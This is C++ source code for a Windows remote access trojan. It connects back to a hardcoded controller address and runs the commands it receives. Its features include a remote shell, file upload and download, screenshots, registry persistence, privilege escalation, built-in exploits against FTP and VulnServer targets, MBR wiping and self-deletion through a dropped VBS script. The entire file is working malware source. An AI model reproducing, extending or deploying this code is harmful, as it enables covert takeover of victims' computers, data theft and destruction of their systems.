#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <dirent.h>
#include "sockets.cpp"
#include "system.cpp"
#include "vulnserver.cpp"
//#include "sys.cpp"
#include <fileapi.h>
#include <random>
#include <string>
#include <algorithm>
#include <winbase.h>
#include <tchar.h>
#include <fstream>
#include <stdexcept>
#include <stdio.h>
#include <windows.h>
//#include <tchar.h>

#define cwd _getcwd
#define cd chdir

std::string Version = "C++ Version 1.0";

std::string get_path()
{
  char buf[4096];
  return cwd(buf, sizeof buf);
}

int get_file_size(std::string filename) // path to file
{
    FILE *p_file = NULL;
    p_file = fopen(filename.c_str(),"rb");
    fseek(p_file,0,SEEK_END);
    int size = ftell(p_file);
    fclose(p_file);
    return size;
}


std::string random_string()
{
     std::string str("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");

     std::random_device rd;
     std::mt19937 generator(rd());

     std::shuffle(str.begin(), str.end(), generator);

     return str.substr(0, 8);
}

bool is_file_exist(const char *fileName)
{
    std::ifstream infile(fileName);
    return infile.good();
}

bool dirExists(const std::string& dirName_in)
{
  DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
  if (ftyp == INVALID_FILE_ATTRIBUTES)
    return false;

  if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
    return true;

  return false;
}

std::string CheckHome(){
  std::string B = "C:\\users\\";
  std::string E = "\\AppData\\Local\\home\\WindowsAPI.exe";
  std::string HOME = B+Username()+E;

  std::string C = "C:\\users\\";
  std::string D = "\\AppData\\Local\\home";
  std::string HOME_FOLDER = C+Username()+D;
    //std::string t = "C:\\windows\\system32";//GetOwnFile()
  std::string file = GetOwnFile();
  std::string f = HOME;
  remove(f.c_str());
  if(!dirExists(HOME_FOLDER)){
    CreateDirectory(HOME_FOLDER.c_str(), NULL);
  }
  MoveFile(file.c_str(),HOME.c_str());
  if(is_file_exist(HOME.c_str())){
    return "true";
  }else{
    return "false";
  }
}

std::string execCMD(const char* cmd) {
  std::string cmd_ = cmd;
  if(cmd_ == "cd"){
    std::string r = get_path();
    return r;
  }
  if(cmd_.rfind("cd",0) == 0){
    std::string path = cmd_.substr(cmd_.find("d") + 2);
    if(cd(path.c_str()) == 0){
      std::string r = "\n\n"+get_path()+'>';
      return r;
    }else{
      return "The system cannot find the path specified.\n";
    }
  }
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    if(result == ""){
      std::string c = cmd;
      result = "'"+c+"' is not recognized as an internal or external command,\noperable program or batch file.";
    }
    return result;
}

void uninstall(SOCKET Connection){
  //clean up registry keys
  Send(Connection,"[*] Cleaning keys...");
  bool un = UnPersist();
  if(un){
    Send(Connection,"[+] Cleaned keys");
  }else{
    Send(Connection,"[-] Could not clean keys");;
  }

  //delete self
  std::string C = "C:\\users\\";
  std::string D = "\\AppData\\Local\\home";
  std::string HOME_FOLDER = C+Username()+D;

  D = "\\AppData\\Local";
  std::string name = random_string()+".vbs";
  std::string SCRIPT = C+Username()+D+"\\"+name;

  //std::string data = "wscript.sleep 10000\n";
  //data += "Set oFso = CreateObject(\"Scripting.FileSystemObject\")\n";
  //data += "If Not oFso.FolderExists(dropzone) Then\n";
  //data += " oFso.DeleteFolder(\""+HOME_FOLDER+"\")\n";
  //data += "End If\n";
  //data += "oFso.DeleteFile Wscript.ScriptFullName, True\n";

  std::string data = "";//"wscript.sleep 10000\n";
  data += "On Error Resume Next\n";
  data += "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n";
  data += "If fso.FolderExists(\""+HOME_FOLDER+"\") Then\n";
  data += "    fso.DeleteFolder \""+HOME_FOLDER+"\", True\n";
  data += "    do while fso.FolderExists(\""+HOME_FOLDER+"\")\n";
  data += "        wscript.sleep 1000\n";
  data += "        fso.DeleteFolder \""+HOME_FOLDER+"\", True\n";
  data += "    Loop\n";
  data += "End If\n";
  data += "fso.DeleteFile Wscript.ScriptFullName, True\n";



  std::ofstream outfile (SCRIPT);

  outfile << data;

  outfile.close();

  std::string cmd = "wscript "+SCRIPT;

  cd("C:\\");

  Send(Connection,"[*] Deleting self...");

  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  ZeroMemory( &si, sizeof(si) );
  si.cb = sizeof(si);
  ZeroMemory( &pi, sizeof(pi) );

  if( !CreateProcess( NULL,   // No module name (use command line)
      (TCHAR*)cmd.c_str(),        // Command line
      NULL,           // Process handle not inheritable
      NULL,           // Thread handle not inheritable
      FALSE,          // Set handle inheritance to FALSE
      0,              // No creation flags
      NULL,           // Use parent's environment block
      NULL,           // Use parent's starting directory
      &si,            // Pointer to STARTUPINFO structure
      &pi )           // Pointer to PROCESS_INFORMATION structure
  )
  {
    Send(Connection,"[-] Failed to start VBS File");
  }else{
    Send(Connection,"[+] VBS File started");
  }

  if(un){
    Send(Connection,"[+] Goodbye! Sucessful uninstall");
  }else{
    Send(Connection,"[*] Goodbye!, but could not clean registry keys..");
  }
  Sleep(100);
  Send(Connection,"EOF");
  exit(3);

}

std::string Exec(std::string cmd, SOCKET Connection){
  std::cout << cmd;
  std::cout << "\n";
  std::string response = "[-] Unknown Command";
  std::string HELP = "";
  std::string B = "C:\\users\\";
  std::string E = "\\AppData\\Local\\home\\WindowsAPI.exe";
  std::string HOME = B+Username()+E;
  std::string C = "C:\\users\\";
  std::string D = "\\AppData\\Local\\home";
  std::string HOME_FOLDER = C+Username()+D;

  HELP += "  close                - Close session\n";
  HELP += "  uninstall            - Uninstalls self. deletes self, home folder and cleans keys\n";
  HELP += "  screenshot           - Takes screenshot\n";
  HELP += "  tasklist             - Lists running processes\n";
  HELP += "  kill [id]            - Kills given process\n";
  HELP += "  exploits             - List built in exploits\n";
  HELP += "  shell                - Opens interactive shell (They can see prompt!)\n";
  HELP += "  version              - Prints version of software\n";
  HELP += "  persist              - Adds persistence\n";
  HELP += "  ls                   - List files in current directory\n";
  HELP += "  sysinfo              - List information about system(OS,AdminPriv)\n";
  HELP += "  home                 - Checks if home and moves cwd to home directory\n";
  HELP += "  del [file]           - Deletes a file\n";
  HELP += "  cwd                  - Gets current directory\n";
  HELP += "  execute [file.exe]   - Executes file\n";
  HELP += "  cd [dir]             - Changes directory\n";
  HELP += "  download [file.exe]  - Downloads file\n";
  HELP += "  upload [file.exe]    - Uploads file\n";
  HELP += "  update [file.exe]    - Updates code with given file\n";
  HELP += "  cat [file.txt]       - Prints out contents of file.txt";

  if(cmd == "shell"){
    return "SHELL";
  }
  else if(cmd == "uninstall"){
    uninstall(Connection);
  }
  else if(cmd == "ls"){
    response = "";
    std::string file;
    std::string files = "  "+get_path() + "\n\n    type      name\n   ------    ------\n";
    struct dirent *de;

    DIR *dr = opendir(get_path().c_str());

    if(dr == NULL){return "Could not open current directory";}

    int loop = 0;
    for(de=readdir(dr); de!=NULL; de=readdir(dr))
    {
      if(loop>1){
        file = de->d_name;
        if(GetFileAttributesA((LPCSTR)file.c_str()) == 16){
          file = "    Dir       "+file;
        }else{
          file = "    Fil       "+file;
        }
        files += file+"\n";
        loop++;
      }else{
        loop++;
      }
    }

    closedir(dr);
    response = files;
  }
  else if(cmd == "version"){
    response = Version;
  }
  else if(cmd == "close"){
    exit(3);
  }
  else if(cmd == "shutdown"){
    if(IsAdmin()){
      Send(Connection,"[*] Shutting down");
      Send(Connection,"EOF");
      std::system("shutdown -s -t 00");
    }else{
      response = "[-] Don't have proper permissions";
    }
  }
  else if(cmd == "wipembr"){
    if(WriteMBR()){
      response = "[+] MBR Wiped.";
    }else{
      response = "[-] Failed to wipe MBR, are you sure you are Admin?";
    }

  }
  else if(cmd == "screenshot"){
    std::string filename = random_string()+".png";
    ScreenShot(filename.c_str());
    response = "[+] Screenshot saved as: "+filename;
  }
  else if(cmd == "cd"){
    return get_path();
  }
  else if(cmd.rfind("del",0) == 0){
    response = "[-] Error, file could not be found";
    std::string f = cmd.substr(cmd.find("l") + 2);
    if(remove(f.c_str()) == 0){
      response = "[+] File Deleted";
    }
  }
  else if(cmd.rfind("vulnserver",0) == 0){
    std::string ip = cmd.substr(cmd.find("ver") + 4);
    if(Exploit(ip,Connection) == 0){
      response = "\n[+] Successfully Exploited!";
    }
  }
  else if(cmd.rfind("cat",0) == 0){
    std::string f = cmd.substr(cmd.find("t") + 2);
    std::cout << f;
    const char* file_name = f.c_str();
    FILE *fd = fopen(file_name, "rb");
    char buffer[1024];
    fread(&buffer, 1, 1024, fd);
    response = buffer;
  }
  else if(cmd == "group"){
    return "0";
    std::string file = HOME_FOLDER+"\\group";
    if(!is_file_exist(file.c_str())){
      response = "default";
    }else{
      std::string file = HOME_FOLDER+"\\group";
      const char* file_name = file.c_str();
      FILE *fd = fopen(file_name, "rb");
      char buffer[1024];
      fread(&buffer, 1, 1024, fd);
      response = buffer;
    }
  }
  else if(cmd.rfind("setgroup",0) == 0){
    std::string group = cmd.substr(cmd.find("p") + 2);

    std::string file = HOME_FOLDER+"\\group";

    //const char* file_name = file.c_str();
    //size_t datasize = group.length();
    //FILE* fd = fopen(file_name, "w");
    ////char text[1024]{0}
    //char text{0};// = group.c_str();
    //strcpy(&text,group.c_str());
    //fwrite(&text, 1, datasize, fd);
    //fclose(fd);

    std::ofstream outfile (file);

    outfile << group;

    outfile.close();
  }
  else if(cmd == "cwd"){
    return get_path();
  }
  else if(cmd.rfind("upload",0) == 0)
  {
    return "UPLOAD";
  }
  else if(cmd.rfind("update",0) == 0)
  {
    return "UPDATE";
  }
  else if(cmd.rfind("download",0) == 0)
  {
    return "DOWNLOAD";
  }
  else if(cmd.rfind("cd",0) == 0)
  {

    std::string path = cmd.substr(cmd.find("d") + 2);
    if (0 == cd(path.c_str()))
    {
        response = get_path();
    }
    else {
        response = "Error";
    }
  }
  else if(cmd.rfind("execute",0) == 0)
  {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    std::string path = cmd.substr(cmd.find("te") + 3);
    //std::cout << path;
    //TCHAR* file = (TCHAR*)path.c_str();

    response = "[+] Executed "+path;
    if( !CreateProcess( NULL,   // No module name (use command line)
        (TCHAR*)path.c_str(),        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    )
    {
      response = "[-] Failed";
    }
    //WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles.
    //CloseHandle( pi.hProcess );
    //CloseHandle( pi.hThread );
  }
  else if(cmd == "persist"){
    if(IsAdmin()){
      if(CheckHome() == "true"){
        if(PersistRoot(HOME)){
          response = "[+] Persisted with root priviledges";
        }else{
          response = "[-] Failed presisting with root priviledges";
        }
      }else{
        response = "[*] Go to home first";
      }

    }else{
      if(Persist(GetOwnFile())){
        response = "[+] Persisted with normal priviledges";
      }else{
        response = "[-] Failed persisting with normal priviledges";
      }
    }
  }
  else if(cmd == "help"){
    response = HELP;
  }else if(cmd == "privesc"){
    if(PrivEsc(GetOwnFile())){
      Send(Connection,"[*] Vulnurability executed, new client with admin priviledges should connect soon");
      if(CleanUp()){
        response += "\n[+] Cleanup successful";
      }else{
        response = "\n[*] Cleanup failed";
      }
    }else{
      response = "[-] Failed";
    }
  }
  else if(cmd == "exploits"){
    std::string ex = "";
    ex += "\n    EXPLOITS\n   ----------\n";
    ex += "  FreeFloatFTP   - usage: FFFTP {ip} {port}\n";
    ex += "  PrivEsc        - usage: privesc\n";
    ex += "  VulnServer     - usage: vulnserver {ip}\n";
    ex += "  WipeMBR        - usage: wipembr\n";

    response = ex;
  }
  else if(cmd.rfind("kill",0) == 0){
    std::string pid = cmd.substr(cmd.find("l") + 2);
    std::cout << pid.length();
    std::cout << "\n";
    if(pid.length() > 5){
      return "[*] Out of range";
    }
    int process_id;
    process_id = stoi(pid);
    response = "[-] Unknown Failure";

    HANDLE RandHand = OpenProcess(PROCESS_TERMINATE, false, (DWORD)process_id);
    int result = TerminateProcess(RandHand, 1);
    CloseHandle(RandHand);
    std::cout << result;
    if(result == 1){
      response = "[+] Process killed";
    }else{
      response = "[-] Failed to kill process";
    }
    return response;


  }
  else if(cmd == "tasklist"){
    std::string r = execCMD(cmd.c_str());
    response = r;
  }
  else if(cmd == "sysinfo"){
    std::string end = "";
    end += "  OS    : "+GetOS()+"\n";
    if(IsAdmin()){
      end += "  Admin : Yes";
    }else{
      end += "  Admin : No";
    }
    return end;
  }else if(cmd == "home"){
    return "0";
    std::string r = CheckHome();
    if(r == "true"){
      response = "[+] At home! "+HOME;
      cd(HOME_FOLDER.c_str());
    }else if (r == "cant"){
      response = "[-] Cannot Move";
    }else{
      response = "[-] Failed to move";
    }
  }
  return response;
}

int ConnectAndListen(){
  SOCKET Connection;
  if(Connect("192.168.1.14",5050,&Connection)==0){
    while(true){
      Sleep(1000);
      char rec[1024]{ 0 };
      int r = recv(Connection,rec,sizeof(rec),0);
      std::cout << r;
      if(r == -1){
        break;
      }
      if(r != 0){
        std::string response = Exec(rec,Connection);
				if(response == "DOWNLOAD"){
					std::string rc = rec;
					std::string f = rc.substr(rc.find("ad") + 3);
					if(is_file_exist(f.c_str()) == 0)
					{
            Send(Connection,"f");
						//Send(Connection,"EOF");
					}else{
            Send(Connection,"t");
            Sleep(100);
            //Send(Connection,"EOF");
            std::string file_size = std::to_string(get_file_size(f));
						send(Connection, file_size.c_str(), file_size.length(), 0);
            Sleep(100);
				 		const char* file_name = f.c_str();
					 	FILE *fd = fopen(file_name, "rb");
						int bytes_read;
						char buffer[1024];
						while (!feof(fd)) {
							if ((bytes_read = fread(&buffer, 1, 1024, fd)) > 0){
							  send(Connection, buffer, bytes_read, 0);
							}
						}
						Send(Connection,"EOF");
						Sleep(1000);
					}
				}else if(response == "UPLOAD"){
          std::string rc = rec;
					std::string f = rc.substr(rc.find("d") + 2);
			 		const char* file_name = f.c_str();
			 		size_t datasize;
					FILE* fd = fopen(file_name, "wb");
					while(true)
					{
            char text[1024]{0};
					  datasize = recv(Connection, text, sizeof(text), 0);
            //std::cout << text;
            if(datasize!=1){
  					  fwrite(&text, 1, datasize, fd);
            }else{
              break;
            }

					}
					fclose(fd);
        }else if(response == "UPDATE"){
            std::string rc = rec;
            std::string f = rc.substr(rc.find("e") + 2);
            const char* file_name = f.c_str();
            size_t datasize;
            FILE* fd = fopen(file_name, "wb");
            while(true)
            {
              char text[1024]{0};
              datasize = recv(Connection, text, sizeof(text), 0);
              //std::cout << text;
              if(datasize!=1){
                fwrite(&text, 1, datasize, fd);
              }else{
                break;
              }

            }
            fclose(fd);
            std::string cmd = "start "+f;
            std::system(cmd.c_str());
            Send(Connection,"[+] Succesfully Updated Code");
            Send(Connection,"EOF");
            exit(3);
					//response = "Success";
        }else if(response == "SHELL"){
          Send(Connection,"[+] Shell Opened");
          Send(Connection,"EOF");
          while(true){
            char rec[1024]{ 0 };
            int r = recv(Connection,rec,sizeof(rec),0);
            std::string rc = rec;
            if(rc == "exit"){
              Send(Connection,"[-] Shell Closed");
              Send(Connection,"EOF");
              break;
            }
            if(r == -1){
              break;
            }else if(r == 0){
              break;
            }else{

              std::string output = execCMD(rc.c_str());
              std::cout << output;
              Send(Connection,output+"\n\n"+get_path()+">");
              Send(Connection,"EOF");
            }
          }
          continue;
        }

        else{
          Send(Connection,response);
          Send(Connection,"EOF");
        }
      }else{
        return 1;
      }
    }
  }
  return 1;
}

int Main(){
  //CheckHome();
  while(true){
    ConnectAndListen();
    Sleep(20000);
  }
}
